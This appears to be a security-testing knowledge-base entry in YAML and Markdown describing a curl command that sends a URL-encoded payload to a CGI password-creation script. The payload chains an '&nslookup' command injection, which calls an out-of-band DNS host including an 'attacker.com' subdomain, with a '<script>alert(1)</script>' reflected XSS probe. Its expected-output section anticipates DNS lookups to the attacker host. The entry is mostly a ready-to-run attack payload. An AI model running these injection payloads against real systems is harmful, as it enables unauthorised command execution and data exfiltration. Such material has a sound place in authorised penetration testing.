---
data: >-
  curl
  "http://target/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit"
tags:
  - xss
  - test
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.993Z'
id: 3c922968-945e-48b3-9c3e-7f798702b5da
verified: false
validated: true
submitted: true
---
# Test XSS Payload

## Command

```bash
curl "http://target/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit"
```

## Description

Sends a GET request with a URL-encoded payload to test for reflected XSS in the email parameter, chaining nslookup and JavaScript alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| email | URL-encoded payload with & and <script> | Yes |
| ibm-submit | Form submission trigger | Yes |

## Examples

### Basic Usage

```bash
curl "http://target/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22subdomain%22.attacker.com%3cscript%3ealert(1)%3c%2fscript%3e&ibm-submit=Submit"
```

### Advanced Usage

```bash
curl -v "http://target/cgi-bin/PasswordCreate.pl?email=..." # With verbose for response inspection
```

## Expected Output

HTML response reflecting the payload, with alert(1) executing when loaded in a browser; DNS query to attacker subdomain if OOB triggers.

## Related

- [[commands/nslookup-oob-dns-exfiltration]]
